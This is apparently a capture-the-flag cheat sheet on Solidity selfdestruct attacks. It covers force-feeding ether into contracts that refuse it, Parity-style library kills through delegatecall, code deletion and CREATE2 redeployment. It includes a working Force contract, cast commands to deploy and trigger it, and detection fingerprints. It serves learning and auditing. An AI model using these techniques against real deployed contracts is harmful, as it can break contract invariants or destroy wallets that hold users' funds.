# selfdestruct — force-feed ether and delete contracts

## The force-feed shape

```solidity
contract Vault {                      // refuses to receive ether
    // no receive(), no fallback, no payable
}
// isSolved: address(Vault).balance > 0
```

A contract can reject `call{value:}` and `.transfer` — but it CANNOT reject a
`selfdestruct`. `selfdestruct(dest)` sends the caller's entire balance to `dest`
**with no code run on dest**. Deploy an attacker contract, fund it, selfdestruct
into the target → the "unpayable" contract holds ether.

```solidity
contract Force {
    constructor() payable {}                     // fund on deploy
    function boom(address target) external {
        selfdestruct(payable(target));           // force-send, no receive needed
    }
}
// cast send with value funds it, then boom() force-feeds the target
```

## The detection fingerprint

- `isSolved` is `address(this).balance > 0` or `> K` and the contract refuses
  ether
- `selfdestruct` reachable in a callable/delegatecall path
- a "contract that must not hold ether" invariant
- **falsifier**: the predicate isn't balance-based, or the contract already
  accepts ether

## The library-kill shape

`selfdestruct` inside a `delegatecall`ed library destroys the CALLER — the
parity wallet: a `WalletLibrary` with a callable `kill`/`initWallet` let the
caller re-init then `selfdestruct` the wallet contract through it. Detection:
a `delegatecall` into code with a `selfdestruct`/`init`.

## The code-deletion shape

`selfdestruct` erases code+storage. A contract that checks `extcodesize` or a
"the contract is gone" predicate is solved by a selfdestruct. Post-Cancun the
same-transaction-created rule narrows it, but a contract deployed in an EARLIER
tx selfdestructs normally.

## The CREATE2-resurrect shape

A selfdestructed contract can be re-deployed to the SAME address with CREATE2
(same deployer, salt, initcode) → code returns to a "deleted" address, breaking
a "this address is empty" assumption.

## The exploitation order

```bash
# fund + force-feed
cast send --create "$(cat Force.hex)" --value 1ether --private-key $KEY --rpc-url $RPC
cast send $FORCE "boom(address)" $VAULT --private-key $KEY --rpc-url $RPC
cast balance $VAULT --rpc-url $RPC   # now > 0 → isSolved
```

## The evidence

`cast balance $VAULT` shows the forced balance; `isSolved() → true`. The
Force contract's deploy (funded) + `boom` tx + the balance read are the chain.
